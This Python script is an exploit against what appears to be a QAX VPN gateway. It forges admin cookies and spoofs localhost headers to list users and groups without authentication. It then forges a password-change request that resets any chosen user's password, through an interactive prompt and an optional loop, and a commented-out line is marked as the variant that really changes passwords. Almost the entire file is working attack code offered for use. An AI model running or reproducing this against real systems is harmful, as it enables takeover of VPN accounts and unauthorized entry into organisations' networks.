from requests import get, post
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()  # Disable SSL warning while using proxies


base_url = "https://ip:port/"
loop = False


class QaxVPNCracker:
    base_url: str = ""
    headers: dict = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1"
    }
    timeout = 5
    proxies: dict = None
    groups: list = None
    users: list = None

    def __init__(self, url: str, proxies: dict = None):
        url_data = urlparse(url)
        self.base_url = url_data.scheme + "://" + url_data.netloc
        if proxies is not None:
            self.proxies = proxies

    def get_users(self):
        header = self.headers
        header["Cookie"] = "gw_admin_ticket=1"
        real_url = self.base_url + "/admin/group/x_group.php?id=1"
        print("[*] Reading user list in", real_url)
        rsp = get(url=real_url, headers=header, verify=False, proxies=self.proxies, timeout=self.timeout)
        if "用户信息" not in rsp.text:
            print("[-] Read failed. Target seems safe.")
            return None
        print("[+] Vuln_1 found. Trying to read user list...")
        rsp_data = BeautifulSoup(rsp.text, 'html.parser')
        group_name_html = rsp_data.find("select", attrs={"name": "parentid"}).find_all("option")[1:]
        user_name_html = rsp_data.find("select", attrs={"name": "user_unsel[]"}).find_all("option")
        group_name = [i.text.strip() for i in group_name_html]
        print("[+] Groups:", group_name)
        user_name = [i.text.split("->")[1].strip() for i in user_name_html]
        print("[+] Users:", user_name)
        print(f"[+] Read [{len(user_name)}] users.")
        self.groups = group_name
        self.users = user_name

    def reset_password(self, user_name: str, new_password: str):
        header = self.headers
        header["Referer"] = self.base_url
        # Won't change Just check vuln
        header["Cookie"] = "admin_id=1;gw_admin_ticket=1;" \
                           "last_step_param={\"user_name\":"+user_name+",\"subAuthId\":\"1\"}"
        # Will really change password! Be careful!!!
        # header["Cookie"] = "admin_id=1;gw_user_ticket=ffffffffffffffffffffffffffffffff;" \
        #                    "last_step_param={\"user_name\":"+user_name+",\"subAuthId\":\"1\"}"
        real_url = self.base_url + "/changepass.php?type=2"
        print("[*] Resetting password in", real_url)
        data = f"password={new_password}&repassword={new_password}&old_pass="
        rsp = post(url=real_url, headers=header, data=data, verify=False, proxies=self.proxies, timeout=self.timeout)
        if rsp.status_code != 200:
            print("[-] Failed to reset passwd, target seems safe.", rsp.status_code)
        else:
            print("[+] Vuln_2 found. Trying to reset password...")
            rsp_html = BeautifulSoup(rsp.text, 'html.parser')
            result = rsp_html.find("td", attrs={"class": "main_font"}).text.strip()
            if "修改密码成功" not in result:
                if result != "":
                    print("[-] Reset failed. Response:", result)
                else:
                    print("[-] Reset failed. Response:", rsp.text, rsp.status_code)
            else:
                print("[+] Reset successed! Response:", result)
                print("[+] ", f"{user_name} / {new_password}")
        print("[*]", '*' * 20)


def read_input(instance: QaxVPNCracker):
    user_name = input("[*] Username to reset password: ")
    if user_name.lower() == "q!":
        stop()
    if user_name not in instance.users:
        print(f"[-] Username [{user_name}] not found.")
    else:
        passwd = input("[*] New password to reset: ")
        if passwd.lower() == "q!":
            stop()
        if passwd != "":
            instance.reset_password(user_name=user_name, new_password=passwd)
        else:
            print("[-] New password can't be empty.")


def stop():
    print("[*] Quit now.")
    exit()


if __name__ == "__main__":
    base_url = base_url.strip('/')
    print("[*] Target:", base_url)
    print("[*] Vuln 1: Reading user list unauthorized.")
    ins = QaxVPNCracker(url=base_url)
    ins.get_users()
    if ins.users is None or len(ins.users) == 0:
        print("[-] User list empty.")
        stop()
    print("[*]", "="*20)
    print("[*] Vuln 2: Resetting password unauthorized.")
    print("[*] If not try to change password(s), input \"q!\" and press Enter to quit.")
    if not loop:
        read_input(instance=ins)
    else:
        while True:
            read_input(instance=ins)
